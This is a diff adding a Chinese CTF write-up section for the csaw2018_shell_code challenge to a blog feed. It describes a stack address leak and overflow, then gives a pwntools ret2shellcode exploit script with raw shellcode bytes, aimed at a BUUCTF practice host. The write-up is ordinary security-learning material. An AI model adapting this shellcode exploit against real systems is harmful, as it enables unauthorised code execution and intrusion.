@@ -8117,6 +8117,19 @@
 
 <p><code>buu</code> 这道题的远程环境出问题了，<code>nc</code> 上去就是 <code>shell</code> 。所以这里打本地演示了</p>
 <p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240312081758301.png" alt="image-20240312081758301"></p>
+<h2 id="csaw2018-shell-code"><a href="#csaw2018-shell-code" class="headerlink" title="csaw2018_shell_code"></a>csaw2018_shell_code</h2><p>保护检测这个 <code>NX</code> 很奇怪，<code>gdb</code> 进去用 <code>vmmap</code> 看了一下，发现 <code>NX</code> 是关的，栈里数据可以执行。</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240312102723041.png" alt="image-20240312102723041"></p>
+<p>主逻辑向栈中两个变量分别输入 <code>15</code> 个字节的数据</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240312102806457.png" alt="image-20240312102806457"></p>
+<p>然后在 <code>printNode</code> 函数中会泄露一个栈地址</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240312102851284.png" alt="image-20240312102851284"></p>
+<p><code>goodbye</code> 函数中存在栈溢出。</p>
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240312102911597.png" alt="image-20240312102911597"></p>
+<p>打法有很多，不管是拼接两段的 <code>shellcode</code> 还是打 <code>shellcode</code> 去调用 <code>read</code> 二次读入一个 <code>shellcode</code> ，或者直接调用 <code>execve</code> ？（没有试）</p>
+<p>总之就是一个很基础的 <code>ret2shellcode</code> ，八仙过海各显神通吧</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span>*</span><br><span class="line">p,e,libc=load(<span class="string">&quot;shellpointcode&quot;</span>,<span class="string">&quot;node5.buuoj.cn:29605&quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;\x31\xFF\x4C\x89\xDA\x48\x89\xE6\x31\xC0\x0F\x05&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">xor edi,edi</span></span><br><span class="line"><span class="string">mov rdx,r11</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;(15 bytes) Text for node 1:  &#x27;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;(15 bytes) Text for node 2: &quot;</span>,<span class="string">&#x27;\x00\x01&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x8E7</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;node.next: &#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;stack_addr&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">3</span>+p64(<span class="number">0xdeadbeef</span>)+p64(stack_addr+<span class="number">0x28</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x34</span>+shellcode_store(<span class="string">&#x27;shell_64&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20240312103210949.png" alt="image-20240312103210949"></p>
 ]]></content>
       <categories>
         <category>buu刷题</category>
